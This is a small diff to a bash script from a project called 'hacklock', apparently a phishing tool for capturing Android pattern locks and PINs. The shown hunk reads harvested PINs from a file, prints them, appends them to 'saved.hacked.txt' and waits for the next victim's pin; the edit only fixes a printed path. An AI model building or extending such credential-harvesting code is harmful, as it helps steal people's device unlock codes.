@@ -158,7 +158,7 @@ IFS=$'\n'
 password=$(grep -o 'Pass:.*' $HOME/hacklock/core/pattern/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Pattern-pin:\e[0m\e[1;77m %s\n\e[0m" $password
 cat $HOME/hacklock/core/pattern/usernames.txt >> $HOME/hacklock/core/pattern/saved.hacked.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m core/%s/saved.hacked.txt\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m core/main/saved.hacked.txt\e[0m\n"
 printf "\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting For Next Pin, Press Ctrl + C to exit...\e[0m\n"
 }
